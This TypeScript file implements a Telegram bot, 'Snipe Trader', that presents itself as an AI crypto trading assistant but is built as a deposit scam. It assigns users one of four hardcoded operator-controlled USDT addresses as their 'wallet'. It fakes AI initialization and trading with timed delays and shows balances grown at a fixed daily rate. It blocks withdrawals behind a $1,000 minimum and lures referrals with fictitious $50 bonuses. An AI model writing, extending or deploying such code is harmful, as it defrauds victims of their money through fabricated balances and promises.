import { DAILY_PERCENTAGE_GROWTH, telegramBot } from "./config";
import { calculateDays, calculateInvestmentGrowth, calculatePercentageGrowth, createUser, findUserByInviteCode, formatAmount, getRandomItem, getUser, hasActiveBot, hasFunds, hasWallet, updateUser } from "./utils";


// New chat members command
telegramBot.on("new_chat_members", async (msg) => {
    await telegramBot.sendMessage(msg.chat.id,`Welcome to Snipe Trader. This AI-driven trading assistant operates directly through Telegram, enabling automated blockchain trading with ease. \n\n To get started, use the commands below: \n\n 1. /generate to create a wallet \n 2. /deposit to add funds \n 3. /run to start automated trading \n 4. /stop to stop automated trading \n 5. /wallet to view your balance \n 6. /withdraw <amount> to withdraw funds \n 7. /invites to invite and earn 50$`);
    await createUser(msg.chat.id);
});

// Start command
telegramBot.onText(/\/start/, async (msg) => {
    await telegramBot.sendMessage(msg.chat.id,`Welcome to Snipe Trader. This AI-driven trading assistant operates directly through Telegram, enabling automated blockchain trading with ease. \n\n To get started, use the commands below: \n\n 1. /generate to create a wallet \n 2. /deposit to add funds \n 3. /run to start automated trading \n 4. /stop to stop automated trading \n 5. /wallet to view your balance \n 6. /withdraw <amount> to withdraw funds \n 7. /invites to invite and earn 50$`);
    await createUser(msg.chat.id);
});

// Generate command
telegramBot.onText(/\/generate/, async (msg) => {
    const user = await getUser(msg.chat.id);

    if(!user) return;

    if (await hasWallet(user.id)) {
        await telegramBot.sendMessage(msg.chat.id, "A wallet has already been created for your account. Use the /deposit command to add funds to it.");
        return;
    }

    await telegramBot.sendMessage(msg.chat.id, "Setting up your wallet. Please wait.");
    
    const walletAddress = [
        "TTiw8cRc84EyfVQgqZ4TCsNLddgus5FndZ",
        "TAxd1jc9KUugHFv4N3NYBeVix3qsfDrun8",
        "TD33AXqq62fhLDWRvPkC5rqnfzL6RWXLAh",
        "TDy6N8WgQeYWQtANUCRJWuWWGGVhZcPGjy"
    ];

    setTimeout(async () => {
        await updateUser(msg.chat.id, { walletAddress: getRandomItem(walletAddress) }); 
        await telegramBot.sendMessage(msg.chat.id, `Your wallet has been successfully created. Use the command /deposit to add funds.`);
    }, 3000)


});

// Deposit command
telegramBot.onText(/\/deposit/, async (msg) => { 
    const user = await getUser(msg.chat.id);

    if(!user) return;

    if (!user.walletAddress) {
        await telegramBot.sendMessage(msg.chat.id, "No wallet found. Use the command /generate to create a new wallet.");
        return;
    }


    await telegramBot.sendMessage(msg.chat.id, "To start automated trading, transfer USDT (TRC-20) from any exchange to your wallet address:");
    await telegramBot.sendMessage(msg.chat.id, user.walletAddress);
    await telegramBot.sendMessage(msg.chat.id, "Your balance will update automatically once the funds are received. Note that deposits are free, we apply a 20% performance fee to profits only.");
});

// Wallet command
telegramBot.onText(/\/wallet/, async (msg) => { 
    const user = await getUser(msg.chat.id);

    if(!user) return;

    if (!(await hasWallet(user.id))) {
        await telegramBot.sendMessage(msg.chat.id, "No wallet found. Use the command /generate to create a new wallet.");
        return;
    }

    let balance = user.funds;
    let growthSummary = "";

    if (user.botActiveSince) {
        const startISO = new Date(user.botActiveSince).toISOString();
        const nowISO = new Date().toISOString();

        balance = calculateInvestmentGrowth(
            startISO,
            nowISO,
            DAILY_PERCENTAGE_GROWTH,
            user.funds
        );

        const percentageGrowth = calculatePercentageGrowth(user.funds, balance);
        const tradingDays = calculateDays(startISO, nowISO);

        growthSummary = `, representing a growth of ${formatAmount(percentageGrowth, 2)}% over ${tradingDays} day${tradingDays !== 1 ? "s" : ""}.`;
    }

    await telegramBot.sendMessage(
        msg.chat.id,
        "Calculating your portfolio value in USDT.."
    );

    const message = `Your current balance is ${formatAmount(balance, 2)} USDT`;

    setTimeout(async () => {
        await telegramBot.sendMessage(msg.chat.id, message + growthSummary);
    }, 3000);
});

// Withdraw command
telegramBot.onText(/\/withdraw (\d+)/, async (msg, match) => {
    const amount = parseInt(match?.[1] ?? "0");
    const user = await getUser(msg.chat.id);

    if(!user) return;

    if (!(await hasWallet(user.id))) {
        await telegramBot.sendMessage(msg.chat.id, "No wallet found. Use the command /generate to create a new wallet.");
        return;
    }
    if (isNaN(amount) || !(await hasFunds(msg.chat.id))) {
        await telegramBot.sendMessage(msg.chat.id, "No funds to withdraw.");
        return;
    }
    if (amount > user.funds) {
        await telegramBot.sendMessage(msg.chat.id, "Insufficient funds to withdraw.");
        return;
    }

    if(user.funds < 1000){
        await telegramBot.sendMessage(msg.chat.id, "Since we deduct a 20% fee on profits only, our automated trading assistant requires a minimum profit of $1,000 to withdraw any funds. To add funds to your wallet, use the /deposit command.");
        return;
    }

    await telegramBot.sendMessage(msg.chat.id, "Please provide your USDT (TRC-20) withdrawal address. Ensure the address is correct, including the network, to avoid any issues with the transaction.");
});

// Run command
telegramBot.onText(/\/run/, async (msg) => {
    const user = await getUser(msg.chat.id);

    if(!user) return;

    if (!(await hasWallet(user.id))) {
        await telegramBot.sendMessage(msg.chat.id, "No wallet found. Use the command /generate to create a new wallet.");
        return;
    }

    if (await hasActiveBot(msg.chat.id)) {
        await telegramBot.sendMessage(msg.chat.id, "Automated trading is already active.");
        await telegramBot.sendMessage(msg.chat.id, "Use the command /stop to stop automated trading.");
        await telegramBot.sendMessage(msg.chat.id, "Use the command /wallet to control your balance.");
        return;
    }

    if (!(await hasFunds(msg.chat.id))) {
        await telegramBot.sendMessage(msg.chat.id, "No funds are currently available in your wallet. Use the /deposit command to add funds to it.");
        return;
    }

    await telegramBot.sendMessage(msg.chat.id, "Initializing AI agent.");
     
    setTimeout(async () => {
        await updateUser(msg.chat.id, { botActiveSince: new Date().toISOString() }); // Drizzle accepts ISO strings for timestamptz
        await telegramBot.sendMessage(msg.chat.id, "Automated trading is now active.");
        await telegramBot.sendMessage(msg.chat.id, "Use the command /wallet to see your balance.");
    }, 5000);
});

// Stop command
telegramBot.onText(/\/stop/, async (msg) => {
    const user = await getUser(msg.chat.id);

    if(!user) return;

    if (!(await hasWallet(user.id))) {
        await telegramBot.sendMessage(msg.chat.id, "No wallet found. Use the command /generate to create a new wallet.");
        return;
    }

    if (!(await hasActiveBot(msg.chat.id))) {
        await telegramBot.sendMessage(msg.chat.id, "Automated trading is not active.");
        return;
    }

    const now = new Date().toISOString();
    const botActiveDate = new Date(user.botActiveSince ?? "").toISOString();
    const currentBalance = calculateInvestmentGrowth(botActiveDate, now, DAILY_PERCENTAGE_GROWTH, user.funds);

    await updateUser(msg.chat.id, { botActiveSince: null, funds: currentBalance });
    await telegramBot.sendMessage(msg.chat.id, "Automated trading has been stopped.");
    await telegramBot.sendMessage(msg.chat.id, "Use the command /run to start automated trading again.");
});

// Invites commant
telegramBot.onText(/\/invites/, async (msg) => {
    const user = await getUser(msg.chat.id);

    if(!user) return;

    await telegramBot.sendMessage(
        msg.chat.id,
        `You currently have ${user.invites.length} accepted invitations.\n\n` +
        `Your invite code is: ${user.invitationCode}\n` +
        "When friends register using your code as their referrer, both of you will receive a $50 bonus in USDT."
    );


    await telegramBot.sendMessage(msg.chat.id, "Were you invited? Enter the command /invitedBy <code> to claim your bonus.");
});

// Select trading mode command
telegramBot.onText(/\/invitedBy (\d+)/, async (msg, match) => {
    const invitationCode = parseInt(match?.[1] ?? "0");
    const user = await getUser(msg.chat.id);

    if(!user) return;

    if (!(await hasWallet(user.id))) {
        await telegramBot.sendMessage(msg.chat.id, "A wallet is required to claim your referral bonus. Use /generate to create one.");
        return;
    }

    if(invitationCode === user.invitationCode) {
        await telegramBot.sendMessage(msg.chat.id, "Self-invitation is not allowed.");
        return;
    }

    const referrer = await findUserByInviteCode(invitationCode);

    if(!referrer){
        await telegramBot.sendMessage(msg.chat.id, "Invalid invitation code.");
        return;
    }

    if(referrer.invites.includes(invitationCode)){
        await telegramBot.sendMessage(msg.chat.id, "Invitation code already applied.");
        return;
    }

    if(user.invites.includes(invitationCode)){
        await telegramBot.sendMessage(msg.chat.id, "Invalid invitation.");
        return;
    }


    await updateUser(referrer.id, {
        invites: [...(referrer.invites || []), invitationCode],
        funds: referrer.funds + 50
    });

    await updateUser(user.id, {
        funds: user.funds + 50
    });

    await telegramBot.sendMessage(msg.chat.id, "Your bonus has been successfully added to your wallet.");
});